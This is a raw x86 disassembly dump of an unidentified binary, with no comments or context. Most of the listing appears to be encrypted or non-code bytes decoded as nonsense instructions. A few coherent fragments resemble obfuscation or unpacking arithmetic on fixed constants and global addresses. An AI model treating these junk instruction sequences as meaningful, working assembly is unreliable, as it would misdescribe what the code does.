  4051ad:	ds (bad) 
  4051af:	std    
  4051b0:	mov    al,0x6e
  4051b2:	or     DWORD PTR [ecx+0x24],esp
  4051b5:	je     0x4051a5
  4051b7:	push   ecx
  4051b8:	and    cl,BYTE PTR [ebp-0x34]
  4051bb:	mov    bh,0xe8
  4051bd:	mov    BYTE PTR [esi+0x6900eeda],al
  4051c3:	add    al,0xcc
  4051c5:	jp     0x4051b3
  4051c7:	sar    ecx,0xa
  4051ca:	(bad)  
  4051cb:	gs rcl DWORD PTR ds:[edx-0x268f7b21],1
  4051d3:	clc    
  4051d4:	inc    esi
  4051d5:	mov    WORD PTR [ecx+ecx*8],gs
  4051d8:	and    al,0x5d
  4051da:	(bad)  
  4051db:	cli    
  4051dc:	psubw  mm3,QWORD PTR [esi-0x2b]
  4051e0:	adc    al,0x14
  4051e2:	sub    edi,DWORD PTR [eax+0x4d]
  4051e5:	jmp    0xd1fb:0xe2e72e86
  4051ec:	mov    bl,0xd8
  4051ee:	lea    eax,[ebx-0x6babf28d]
  4051f4:	in     al,0x73
  4051f6:	cdq    
  4051f7:	adc    eax,0x74e58727
  4051fc:	add    eax,0x3a25c353
  405201:	dec    ebp
  405202:	test   al,0xc
  405204:	retf   0x8593
  405207:	xchg   ecx,eax
  405208:	xor    BYTE PTR [ebp-0x15ad42db],bl
  40520e:	add    dh,bl
  405210:	int3   
  405211:	inc    ch
  405213:	xchg   ebx,eax
  405214:	fs ds lock sub al,0xb5
  405219:	jp     0x405275
  40521b:	fdivr  QWORD PTR [edi]
  40521d:	cmp    al,0xbd
  40521f:	and    DWORD PTR [edi],esi
  405221:	xlat   BYTE PTR ds:[ebx]
  405222:	stos   DWORD PTR es:[edi],eax
  405223:	aam    0x60
  405225:	pop    esp
  405226:	cmp    BYTE PTR [edx+eiz*1],al
  405229:	test   BYTE PTR [ecx+0x25],bh
  40522c:	lock rcr BYTE PTR [edi+0x59],0xd9
  405231:	sub    BYTE PTR [edx-0x18],0xb9
  405235:	imul   eax,DWORD PTR [edx],0x7e
  405238:	lahf   
  405239:	mov    ebp,0x6b507f9b
  40523e:	lds    ebx,FWORD PTR [ecx-0x4a]
  405241:	push   cs
  405242:	das    
  405243:	loopne 0x4052bf
  405245:	and    bl,BYTE PTR [ebp+0x7052cf51]
  40524b:	dec    ecx
  40524c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40524d:	es js  0x405254
  405250:	sub    al,0xe7
  405252:	int3   
  405253:	jo     0x4051d6
  405255:	aad    0x73
  405257:	push   0xaa4f284c
  40525c:	psubw  mm1,QWORD PTR [esi+ecx*2+0x428ef919]
  405264:	push   esp
  405265:	mov    esp,0xf2bd3a5e
  40526a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40526b:	xchg   BYTE PTR [edx],ch
  40526d:	inc    ecx
  40526e:	fmul   st,st(5)
  405270:	shl    ebx,cl
  405272:	hlt    
  405273:	sub    al,0x7b
  405275:	sbb    eax,edx
  405277:	push   esi
  405278:	cli    
  405279:	lea    ecx,[ecx-0x2d955e34]
  40527f:	cmp    DWORD PTR [edx-0x5d],ebx
  405282:	clc    
  405283:	std    
  405284:	scas   al,BYTE PTR es:[edi]
  405285:	imul   esi,DWORD PTR [ebp-0x70b75004],0x34
  40528c:	mov    cr3,esi
  40528f:	arpl   dx,bp
  405291:	(bad)  
  405292:	gs lock inc edi
  405295:	sbb    al,0x4
  405297:	cmp    DWORD PTR [eax],ebx
  405299:	xchg   esi,eax
  40529a:	mov    ebp,0xaaa5a7bc
  40529f:	mov    esp,0xdbbbc22c
  4052a4:	lods   eax,DWORD PTR ds:[esi]
  4052a5:	inc    ebx
  4052a6:	mov    cl,0x28
  4052a8:	hlt    
  4052a9:	inc    esi
  4052aa:	cld    
  4052ab:	mov    ds:0x5d84a5e1,eax
  4052b0:	or     ah,al
  4052b2:	sbb    BYTE PTR [ebx-0x2f],bh
  4052b5:	jmp    0x40531d
  4052b7:	mov    bl,0x20
  4052b9:	push   edi
  4052ba:	sbb    dl,bh
  4052bc:	jno    0x4052ec
  4052be:	shl    cl,0xec
  4052c1:	and    ecx,edx
  4052c3:	pop    ds
  4052c4:	jmp    0xa5c3:0x7a7d0897
  4052cb:	jnp    0x4052f7
  4052cd:	xor    BYTE PTR [esi*4-0x3400270a],bl
  4052d4:	out    dx,al
  4052d5:	jae    0x405275
  4052d7:	leave  
  4052d8:	dec    BYTE PTR [ebp+0xfeb7b1c]
  4052de:	mov    ebx,0x1f4f9404
  4052e3:	mov    esp,0x11828a2
  4052e8:	inc    esi
  4052e9:	popf   
  4052ea:	outs   dx,DWORD PTR ds:[esi]
  4052eb:	mov    eax,?
  4052ed:	shl    DWORD PTR [ecx],cl
  4052ef:	inc    ebp
  4052f0:	mov    esi,0x55cf1cd3
  4052f6:	and    ah,BYTE PTR [edx-0x46edf423]
  4052fc:	or     BYTE PTR [eax],bl
  4052fe:	or     eax,0x5ce6819
  405303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405304:	mov    eax,0x4aa5372f
  405309:	in     eax,dx
  40530a:	aam    0x12
  40530c:	in     eax,0xfb
  40530e:	jmp    0x4a07:0x7a96951
  405315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405316:	fsubr  QWORD PTR [ebx]
  405318:	mov    ebx,0xa5c52843
  40531d:	popf   
  40531e:	xchg   ecx,eax
  40531f:	dec    esi
  405320:	xchg   ebp,eax
  405321:	sbb    al,0x84
  405323:	sahf   
  405324:	mov    ecx,0xe26e073a
  405329:	fcmovb st,st(7)
  40532b:	jl     0x405320
  40532d:	shl    DWORD PTR [edi+0x3c],1
  405330:	adc    al,0x3b
  405332:	cmp    DWORD PTR [esi+0xdc68723],edi
  405338:	xchg   edx,eax
  405339:	in     eax,dx
  40533a:	out    0x66,eax
  40533c:	jp     0x4052e8
  40533e:	pop    ecx
  40533f:	pop    edx
  405340:	adc    BYTE PTR [eax],dl
  405342:	ins    BYTE PTR es:[edi],dx
  405343:	gs jp  0x4053c1
  405346:	imul   edi,DWORD PTR [edx+0x24],0x1
  40534a:	imul   ecx,DWORD PTR [ecx+0x7583b38f],0x1c7cf9b9
  405354:	and    bl,al
  405356:	mov    edx,0x4067a98b
  40535b:	mov    ?,WORD PTR [esi+ecx*1-0x3bf951e4]
  405362:	jge    0x4053d0
  405364:	repnz retf 0xe57e
  405368:	outs   dx,DWORD PTR ds:[esi]
  405369:	pop    eax
  40536a:	sbb    al,0x19
  40536c:	lahf   
  40536d:	ja     0x40530a
  40536f:	addr16 in al,0xe3
  405372:	pop    ds
  405373:	ror    DWORD PTR [edx+eax*8+0xa],cl
  405377:	add    eax,0xf3f326c1
  40537c:	rcr    BYTE PTR [eax],0x55
  40537f:	sbb    eax,0xcc8b1497
  405384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405385:	test   BYTE PTR [edi-0x1a2f78e0],dh
  40538b:	jl     0x40536a
  40538d:	je     0x405404
  40538f:	lds    ecx,FWORD PTR [esi+0x62]
  405392:	push   eax
  405393:	(bad)  ds:[edi-0x35]
  405397:	sbb    edi,DWORD PTR [ebp+0x1d]
  40539a:	and    BYTE PTR [ecx-0x3a],bh
  40539d:	fucomip st,st(2)
  40539f:	mov    esi,0xf44e3a85
  4053a4:	pop    es
  4053a5:	daa    
  4053a6:	shl    BYTE PTR [ecx+0x74],1
  4053a9:	cmp    ch,BYTE PTR [esi-0x22]
  4053ac:	mov    ebp,0x76098663
  4053b1:	into   
  4053b2:	in     eax,dx
  4053b3:	(bad)  
  4053b4:	outs   dx,DWORD PTR ds:[esi]
  4053b5:	mov    ds:0xbb61ca95,eax
  4053ba:	rol    BYTE PTR [edx+0x6d],1
  4053bd:	test   eax,0xa625967e
  4053c2:	std    
  4053c3:	je     0x4053e3
  4053c5:	mov    ah,0x6a
  4053c7:	cdq    
  4053c8:	sub    cl,BYTE PTR [ebx]
  4053ca:	inc    ebx
  4053cb:	inc    esp
  4053cc:	sti    
  4053cd:	adc    edx,DWORD PTR [ecx]
  4053cf:	xchg   esi,eax
  4053d0:	push   ds
  4053d1:	mov    bh,0x85
  4053d3:	xchg   ebp,eax
  4053d4:	sub    ebp,DWORD PTR [ebp+0x19]
  4053d7:	push   edx
  4053d8:	sub    al,0x76
  4053da:	ret    0xad4e
  4053dd:	pop    esp
  4053de:	das    
  4053df:	jmp    0xf4cb2fd2
  4053e4:	xchg   DWORD PTR [ecx],edx
  4053e6:	loopne 0x405382
  4053e8:	leave  
  4053e9:	xor    esp,ebp
  4053eb:	inc    edi
  4053ec:	and    eax,DWORD PTR [ebx]
  4053ee:	mov    edx,0xe770e477
  4053f3:	push   ds
  4053f4:	dec    edx
  4053f5:	int3   
  4053f6:	ins    BYTE PTR es:[edi],dx
  4053f7:	daa    
  4053f8:	xchg   ebx,eax
  4053f9:	push   esp
  4053fa:	dec    ebp
  4053fb:	imul   ecx,DWORD PTR [ecx-0x5fd707b],0xafa9c4a
  405405:	push   esi
  405406:	mov    ds:0xc579d355,al
  40540b:	add    edx,DWORD PTR cs:[edi]
  40540e:	cmp    eax,DWORD PTR [ebx]
  405410:	not    BYTE PTR [ecx-0x45]
  405413:	adc    dl,cl
  405415:	and    DWORD PTR [edx],0x84b3c0b7
  40541b:	imul   eax,DWORD PTR [ebx],0x526d038a
  405421:	int    0xc2
  405423:	xor    eax,0x457d49
  405428:	aam    0x77
  40542a:	lods   al,BYTE PTR ds:[esi]
  40542b:	mov    esi,0xe3d73dad
  405430:	xor    al,0xba
  405432:	and    eax,0x5a5c68a9
  405437:	sub    eax,0x33619ee
  40543c:	(bad)  
  40543d:	xor    ecx,edi
  40543f:	xchg   ebp,eax
  405440:	clc    
  405441:	add    edx,esi
  405443:	fdiv   QWORD PTR [ecx+edx*4-0x6b203409]
  40544a:	push   ebx
  40544b:	and    eax,0xed8764f6
  405450:	enter  0xe618,0xeb
  405454:	mov    BYTE PTR ds:0x774f81e4,ch
  40545a:	xor    BYTE PTR [ecx+0xfdf6139],ah
  405460:	adc    bh,0xe0
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0xebefbb8]
  405484:	out    dx,al
  405485:	shr    BYTE PTR cs:[ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40549a
  40548f:	xor    esi,DWORD PTR [ecx]
  405491:	sbb    eax,ebp
  405493:	sahf   
  405494:	call   0xb14199d5
  405499:	out    0x43,eax
  40549b:	inc    edx
  40549c:	adc    dl,dh
  40549e:	mov    ds:0x125bbad0,eax
  4054a3:	dec    edi
  4054a4:	push   es
  4054a5:	lods   al,BYTE PTR ds:[esi]
  4054a6:	and    al,BYTE PTR [ebx]
  4054a8:	pop    edi
  4054a9:	add    BYTE PTR [eax+0x253f5759],dh
  4054af:	xchg   ecx,eax
  4054b0:	jo     0x40550b
  4054b2:	push   0x954017f4
  4054b7:	jbe    0x4054d2
  4054b9:	xor    al,0xac
  4054bb:	mov    ds:0xca150dae,al
  4054c0:	jbe    0x40544b
  4054c2:	stc    
  4054c3:	xchg   edx,eax
  4054c4:	xchg   edi,eax
  4054c5:	inc    ecx
  4054c6:	stos   BYTE PTR es:[edi],al
  4054c7:	push   ebx
  4054c8:	push   esp
  4054c9:	xchg   ebp,eax
  4054ca:	jp     0x4054d5
  4054cc:	add    BYTE PTR [eax-0x1e],0x18
  4054d0:	scas   eax,DWORD PTR es:[edi]
  4054d1:	ins    BYTE PTR es:[edi],dx
  4054d2:	ins    DWORD PTR es:[edi],dx
  4054d3:	ja     0x4054e6
  4054d5:	fisub  WORD PTR [eax-0x54]
  4054d8:	xchg   edi,eax
  4054d9:	popa   
  4054da:	into   
  4054db:	push   ecx
  4054dc:	mov    BYTE PTR [esi+edx*2-0x69],dl
  4054e0:	test   DWORD PTR [eax+eiz*1],eax
  4054e3:	xchg   ebp,eax
  4054e4:	and    al,0x10
  4054e6:	dec    ebp
  4054e7:	ins    DWORD PTR es:[edi],dx
  4054e8:	into   
  4054e9:	icebp  
  4054ea:	mov    ebp,0x22806504
  4054ef:	sub    DWORD PTR [edx-0x4a],esi
  4054f2:	and    ecx,ebp
  4054f4:	test   BYTE PTR [edx],ch
  4054f6:	inc    ebx
  4054f7:	push   ds
  4054f8:	push   edi
  4054f9:	(bad)  
  4054fa:	xlat   BYTE PTR ds:[ebx]
  4054fb:	mov    ?,WORD PTR [ecx-0x9]
  4054fe:	jp     0x405525
  405500:	dec    eax
  405501:	dec    edi
  405502:	mov    ah,0xf4
  405504:	in     eax,dx
  405505:	fnsave [edi-0x232e0959]
  40550b:	xchg   ebp,eax
  40550c:	mov    ds:0x6786db82,al
  405511:	push   0xff202795
  405516:	stos   BYTE PTR es:[edi],al
  405517:	mov    ecx,ss
  405519:	add    BYTE PTR [ecx],ah
  40551b:	xor    dl,BYTE PTR [ebp-0x74]
  40551e:	dec    ecx
  40551f:	xor    dl,BYTE PTR [edx]
  405521:	jg     0x405591
  405523:	or     DWORD PTR [edi-0xc66ba2c],edx
  405529:	adc    eax,0xc26450bf
  40552e:	xchg   BYTE PTR [eax],ah
  405530:	mov    WORD PTR ss:[edi+0x63],gs
  405534:	loop   0x4055ad
  405536:	or     eax,0x6f328ef6
  40553b:	aaa    
  40553c:	cli    
  40553d:	and    eax,0xd57db663
  405542:	mov    bl,0xb1
  405544:	ss pop esi
  405546:	inc    edi
  405547:	std    
  405548:	(bad)  [esi]
  40554a:	push   esi
  40554b:	inc    esi
  40554c:	imul   edi,DWORD PTR [ebx-0x4cc626dd],0x5b
  405553:	icebp  
  405554:	scas   eax,DWORD PTR es:[edi]
  405555:	pop    ebp
  405556:	fst    QWORD PTR [ecx+0x2ec4bd09]
  40555c:	mov    dh,ah
  40555e:	call   0xf96d1937
  405563:	rcl    edx,0x6e
  405566:	mov    ds:0xf61db252,eax
  40556b:	icebp  
  40556c:	retf   
  40556d:	pop    es
  40556e:	in     al,0x20
  405570:	stos   BYTE PTR es:[edi],al
  405571:	inc    ecx
  405572:	aad    0x7b
  405574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405575:	mov    ebp,ecx
  405577:	dec    ebp
  405578:	loopne 0x4055e9
  40557a:	and    al,ch
  40557c:	adc    dl,ah
  40557e:	dec    ebp
  40557f:	pop    ebp
  405580:	repz sahf 
  405582:	pop    ebp
  405583:	popa   
  405584:	adc    edx,DWORD PTR [edi-0x75705f66]
  40558a:	mov    ecx,0x283242eb
  40558f:	pop    ss
  405590:	sbb    edx,DWORD PTR [edi+0x3d1cbe4d]
  405596:	mov    cs,WORD PTR [edx-0x54]
  405599:	adc    al,0x39
  40559b:	cmp    BYTE PTR ds:0x237804bc,ah
  4055a1:	mov    cl,0x27
  4055a3:	fmul   DWORD PTR [ecx]
  4055a5:	push   es
  4055a6:	push   0xffffff82
  4055a8:	xor    BYTE PTR [edx],0x3b
  4055ab:	scas   al,BYTE PTR es:[edi]
  4055ac:	ret    0x948
  4055af:	bound  ebx,QWORD PTR [esi]
  4055b1:	add    al,0xe8
  4055b3:	cmp    dh,dl
  4055b5:	xchg   edi,eax
  4055b6:	mov    ?,ebx
  4055b8:	sbb    dl,dh
  4055ba:	mov    ch,0x68
  4055bc:	sbb    bl,BYTE PTR [ebp-0x4de91312]
  4055c2:	cmc    
  4055c3:	pop    edi
  4055c4:	mov    gs,WORD PTR [ebx-0x78e52b70]
  4055ca:	leave  
  4055cb:	xchg   edx,eax
  4055cc:	call   0xee8f0ece
  4055d1:	ficom  WORD PTR [edi+0x78]
  4055d4:	shl    eax,cl
  4055d6:	int3   
  4055d7:	shl    DWORD PTR [ecx-0x11],1
  4055da:	jne    0x40563e
  4055dc:	pop    eax
  4055dd:	inc    eax
  4055de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055df:	and    al,ch
  4055e1:	inc    ebx
  4055e2:	sub    al,0xe3
  4055e4:	sbb    ebx,DWORD PTR [esp+ebx*8-0x66d0c7c5]
  4055eb:	test   edx,esi
  4055ed:	xor    al,0xe8
  4055ef:	fsub   DWORD PTR [esi]
  4055f1:	imul   eax,DWORD PTR [edx-0x7a225d6f],0x3e01ee38
  4055fb:	lea    edx,[ebp-0x1db25dde]
  405601:	psadbw mm7,QWORD PTR ds:0x4e1d0f73
  405608:	push   edx
  405609:	mov    eax,ds:0x78dfde1c
  40560e:	fmulp  st(5),st
  405610:	mov    dl,0xb7
  405612:	dec    esp
  405613:	retf   0x6eb4
  405616:	std    
  405617:	inc    ebp
  405618:	in     al,0xbf
  40561a:	mov    al,0x7c
  40561c:	jle    0x40564d
  40561e:	dec    ebp
  40561f:	ja     0x405618
  405621:	xchg   edx,eax
  405622:	mov    edi,0xe5088d0a
  405627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405628:	mov    es,eax
  40562a:	and    DWORD PTR ds:0x915d0e72,eax
  405630:	sbb    edx,esp
  405632:	pop    ecx
  405633:	jnp    0x4056a6
  405635:	xchg   ebp,eax
  405636:	fwait
  405637:	es pushf 
  405639:	div    ecx
  40563b:	jg     0x40569b
  40563d:	or     dh,bl
  40563f:	pop    esi
  405640:	xchg   dl,dl
  405642:	sbb    al,0x49
  405644:	inc    ebx
  405645:	nop
  405646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405647:	pop    es
  405648:	adc    ebp,DWORD PTR [edi+0x43]
  40564b:	and    BYTE PTR [ebx-0x13],dl
  40564e:	fcomp  QWORD PTR [edx+0x1ec06f9a]
  405654:	add    edx,DWORD PTR [edi]
  405656:	push   0xa36b90dc
  40565b:	mov    dl,0xd4
  40565d:	call   0xabde:0x1b3c1caa
  405664:	cdq    
  405665:	es xchg esi,eax
  405667:	pop    es
  405668:	cmp    dl,BYTE PTR [edi]
  40566a:	dec    BYTE PTR [ecx+0x9acb113]
  405670:	addr16 xchg esp,eax
  405672:	leave  
  405673:	and    BYTE PTR [eax+0x0],dh
  405676:	and    ebx,ecx
  405678:	push   edi
  405679:	test   al,0xa4
  40567b:	in     eax,0xe5
  40567d:	nop
  40567e:	std    
  40567f:	stos   BYTE PTR es:[edi],al
  405680:	test   eax,0xba136a51
  405685:	clc    
  405686:	out    0xf1,al
  405688:	push   es
  405689:	fisttp WORD PTR [eax+0x3f]
  40568c:	and    bl,cl
  40568e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40568f:	mov    esp,0xcb1fef03
  405694:	stos   DWORD PTR es:[edi],eax
  405695:	call   0x9666:0x4bf68c61
  40569c:	cdq    
  40569d:	daa    
  40569e:	in     eax,dx
  40569f:	pop    esi
  4056a0:	daa    
  4056a1:	mov    bl,0x1c
  4056a3:	pop    ecx
  4056a4:	pop    esi
  4056a5:	std    
  4056a6:	out    dx,al
  4056a7:	mov    bh,0xc3
  4056a9:	shl    BYTE PTR [esp+ebx*1],1
  4056ac:	dec    edx
  4056ad:	mov    esp,0x684df3ea
  4056b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056b3:	sbb    ah,bl
  4056b5:	inc    edi
  4056b6:	test   DWORD PTR [edi],0x28e7196d
  4056bc:	aaa    
  4056bd:	inc    ebx
  4056be:	jne    0x40566b
  4056c0:	push   esi
  4056c1:	push   eax
  4056c2:	add    cl,BYTE PTR [ebp-0x549091d9]
  4056c8:	mov    bl,0xd3
  4056ca:	std    
  4056cb:	icebp  
  4056cc:	idiv   DWORD PTR [eax+ebp*2-0x5f1a3946]
  4056d3:	mov    ebp,0x2b323c3a
  4056d8:	out    0xe7,al
  4056da:	cmp    ecx,DWORD PTR [esi]
  4056dc:	pop    es
  4056dd:	add    al,al
  4056df:	push   ds
  4056e0:	adc    BYTE PTR [esi-0x7cb90f44],dl
  4056e6:	shl    BYTE PTR [edx],1
  4056e8:	or     ch,BYTE PTR [edi]
  4056ea:	clc    
  4056eb:	pop    es
  4056ec:	cmp    BYTE PTR [ebx-0x6c9f841d],ah
  4056f2:	xchg   DWORD PTR [ebx-0x5bb5808e],edi
  4056f8:	cmp    bh,BYTE PTR [eax]
  4056fa:	and    cl,BYTE PTR [edi]
  4056fc:	xchg   edi,eax
  4056fd:	in     al,dx
  4056fe:	and    BYTE PTR [eax-0x71],0xd9
  405702:	in     eax,0xe6
  405704:	mov    dl,0x6c
  405706:	(bad)  
  405707:	repnz (bad) 
  40570a:	daa    
  40570b:	jl     0x405747
  40570d:	cs jbe 0x40571e
  405710:	hlt    
  405711:	cdq    
  405712:	mov    bh,0x15
  405714:	leave  
  405715:	jnp    0x40573f
  405717:	mov    eax,ds:0x98624770
  40571c:	inc    edx
  40571d:	aam    0xcb
  40571f:	cmp    eax,0x43765ec6
  405724:	push   esp
  405725:	fwait
  405726:	xchg   ebp,eax
  405727:	sub    eax,0x54080271
  40572c:	retf   0xa3eb
  40572f:	mov    bl,0x82
  405731:	sbb    al,BYTE PTR [ebp-0x54]
  405734:	xchg   edx,eax
  405735:	adc    DWORD PTR [esp+edi*4-0x7dc7b779],ebx
  40573c:	(bad)  
  40573d:	scas   al,BYTE PTR es:[edi]
  40573e:	loope  0x4057ae
  405740:	in     eax,dx
  405741:	mov    DWORD PTR [esi],ecx
  405743:	sub    BYTE PTR [ecx-0x16],ah
  405746:	pop    ss
  405747:	out    0x88,al
  405749:	je     0x40571d
  40574b:	pop    eax
  40574c:	xchg   ecx,eax
  40574d:	adc    al,0x10
  40574f:	push   ss
  405750:	arpl   bx,dx
  405752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405753:	xchg   edx,eax
  405754:	dec    esi
  405755:	repnz push edx
  405757:	jns    0x405733
  405759:	jge    0x4057d5
  40575b:	jp     0x4056e3
  40575d:	push   es
  40575e:	push   edi
  40575f:	mov    eax,0xa36505ba
  405764:	push   cs
  405765:	arpl   WORD PTR [eax+0x48b45474],dx
  40576b:	js     0x405707
  40576d:	inc    ebp
  40576e:	test   BYTE PTR [eax+ebp*8],bl
  405771:	arpl   WORD PTR [eax+0x1a],si
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x11
  4057f5:	mov    esi,0x363ad612
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	mov    eax,ds:0x143767c
  405805:	mov    cl,cl
  405807:	mov    ds:0x1fed614c,eax
  40580c:	xchg   ebx,eax
  40580d:	sub    edi,DWORD PTR [esp+eiz*2+0x69e1f270]
  405814:	scas   al,BYTE PTR es:[edi]
  405815:	cmc    
  405816:	mov    esp,0x532742e2
  40581b:	fnstcw WORD PTR [eax]
  40581d:	push   es
  40581e:	jo     0x40583e
  405820:	inc    esi
  405821:	dec    BYTE PTR [esi]
  405823:	and    ebp,edx
  405825:	les    esp,FWORD PTR [ebp+0x44eec759]
  40582b:	cld    
  40582c:	xchg   edx,eax
  40582d:	xor    eax,0xf279fa04
  405832:	sub    DWORD PTR [esi+ebx*8+0x7e],0x4d
  405837:	adc    eax,DWORD PTR fs:[eax+0x6e378d94]
  40583e:	pop    ebx
  40583f:	pop    ebp
  405840:	xchg   esi,eax
  405841:	and    BYTE PTR [edx+0x2b],cl
  405844:	mov    dh,0x52
  405846:	inc    esi
  405847:	repz pushf 
  405849:	add    dh,BYTE PTR [ebp+0x78]
  40584c:	dec    ecx
  40584d:	jmp    0x405861
  40584f:	or     edx,DWORD PTR [eax+0x4]
  405852:	jecxz  0x4057df
  405854:	retf   0xca05
  405857:	jmp    0x405892
  405859:	popa   
  40585a:	mov    edx,0xc4d8acab
  40585f:	test   esi,edi
  405861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405862:	inc    esp
  405863:	mov    dl,0x4c
  405865:	retf   
  405866:	imul   BYTE PTR [ecx]
  405868:	push   edi
  405869:	stos   DWORD PTR es:[edi],eax
  40586a:	bound  esp,QWORD PTR [ecx]
  40586c:	jb     0x4058cc
  40586e:	cwde   
  40586f:	jmp    0x7ded32ff
  405874:	add    eax,0x9fc60890
  405879:	xchg   ecx,eax
  40587a:	xchg   ecx,eax
  40587b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587c:	adc    ecx,DWORD PTR ds:0x4e601c9c
  405882:	test   BYTE PTR [edi-0x176b31ee],0x53
  405889:	and    edx,ebp
  40588b:	ins    BYTE PTR es:[edi],dx
  40588c:	adc    al,dh
  40588e:	mov    dh,0xe8
  405890:	test   al,0xde
  405892:	push   0x4d
  405894:	xor    al,0xe8
  405896:	sub    eax,0xc720ae46
  40589b:	out    dx,al
  40589c:	ret    0xd3d9
  40589f:	push   edi
  4058a0:	dec    edi
  4058a1:	cwde   
  4058a2:	je     0x405886
  4058a4:	cdq    
  4058a5:	and    ah,0x34
  4058a8:	in     al,0xee
  4058aa:	xor    edx,DWORD PTR [ebx+0x5e]
  4058ad:	dec    esi
  4058ae:	inc    ecx
  4058af:	aam    0x90
  4058b1:	test   eax,0xcbd6b43a
  4058b6:	push   edi
  4058b7:	repnz out dx,al
  4058b9:	nop
  4058ba:	cdq    
  4058bb:	sar    DWORD PTR [edx-0x1f],0xda
  4058bf:	push   es
  4058c0:	adc    edi,esp
  4058c2:	imul   esp,DWORD PTR [eax+0x55],0xffffff9a
  4058c6:	xlat   BYTE PTR ds:[ebx]
  4058c7:	push   es
  4058c8:	push   esi
  4058c9:	sub    ecx,DWORD PTR [esi]
  4058cb:	(bad)  
  4058cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058cd:	pop    ss
  4058ce:	dec    DWORD PTR [edi+0x53]
  4058d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d2:	je     0x405948
  4058d4:	data16 sbb BYTE PTR [eax+0x53fdba5d],dl
  4058db:	dec    edi
  4058dc:	cwde   
  4058dd:	jp     0xd460fa88
  4058e3:	aad    0x40
  4058e5:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4058e7:	(bad)  
  4058e8:	adc    BYTE PTR [edx-0x61],dh
  4058eb:	sti    
  4058ec:	retf   0x613b
  4058ef:	xor    ebx,DWORD PTR [ebx+eax*8-0x6672cb48]
  4058f6:	pop    ss
  4058f7:	out    0x87,al
  4058f9:	pop    esp
  4058fa:	lahf   
  4058fb:	(bad)  
  4058fc:	xchg   esi,eax
  4058fd:	pop    esi
  4058fe:	sub    al,0xc2
  405900:	xchg   DWORD PTR [edx+ebx*8-0x1e],ebx
  405904:	mov    al,0xd
  405906:	push   edx
  405907:	(bad)  
  405909:	cmp    dh,BYTE PTR [eax+0x2b200e06]
  40590f:	cmp    eax,0xfab244ad
  405914:	test   DWORD PTR [esp],0x67a1263a
  40591b:	adc    eax,DWORD PTR [ecx+0x15c10dda]
  405921:	or     DWORD PTR [eax+0x2d7b6f97],edi
  405927:	fisub  WORD PTR [eax-0x22ccec48]
  40592d:	ja     0x405947
  40592f:	mov    al,0xab
  405931:	or     BYTE PTR [ecx-0x42],al
  405934:	iret   
  405935:	out    dx,eax
  405936:	jge    0x40592d
  405938:	sbb    eax,0x8c384990
  40593d:	ret    0xfdc3
  405940:	enter  0x3b2b,0x52
  405944:	imul   ebx,esp,0x1
  405947:	sub    eax,0x45c98e58
  40594c:	in     eax,dx
  40594d:	mov    ecx,0x79eefa00
  405952:	in     al,dx
  405953:	push   ecx
  405954:	adc    al,0x59
  405956:	iret   
  405957:	jns    0x40594a
  405959:	xor    DWORD PTR [esi+0x7c0aa767],esi
  40595f:	xchg   edx,edi
  405961:	and    DWORD PTR [eax+0x31823c21],ebx
  405967:	or     eax,0xeb6eb727
  40596c:	jno    0x405972
  40596e:	or     DWORD PTR [edi+0xdbb0ad2],ecx
  405974:	ficomp DWORD PTR [ecx+0x66ca2fac]
  40597a:	inc    ecx
  40597b:	and    eax,0xdb23301b
